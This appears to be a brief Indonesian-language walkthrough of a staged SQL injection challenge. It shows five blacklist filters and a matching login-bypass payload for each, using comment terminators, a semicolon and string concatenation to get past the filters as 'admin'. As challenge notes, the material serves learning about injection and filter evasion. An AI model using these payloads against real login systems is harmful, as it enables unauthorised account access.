filter pertama yaitu 
$filter = array("or");

jika kita bisa membypass sqlinya tanpa query or kita bisa masuk round selanjutnya
SELECT * FROM users WHERE users = 'admin'-- - AND password = 'dsfdsfds';
payload = admin'-- -

filter ke 2 yaitu
$filter = array("or", "and", "like", "=", "--");

SELECT * FROM users WHERE users = 'admin'/* */ AND password = 'dsfdsfds';
payload = admin'/* */

filter ke 3 yaitu 
$filter = array(" ", "or", "and", "=", "like", ">", "<", "--");

SELECT * FROM users WHERE users = 'admin'; AND password = 'dsfdsfds';
payload = admin';

filter ke 4 yaitu
$filter = array(" ", "or", "and", "=", "like", ">", "<", "--", "admin");
SELECT * FROM users WHERE username='ad'||'min'; AND password='pass'
payload = ad'||'min';

filter ke 5 yaitu 
$filter = array(" ", "or", "and", "=", "like", ">", "<", "--", "union", "admin");

SELECT * FROM users WHERE username='ad'||'min'; AND password='pass'
payload = ad'||'min';

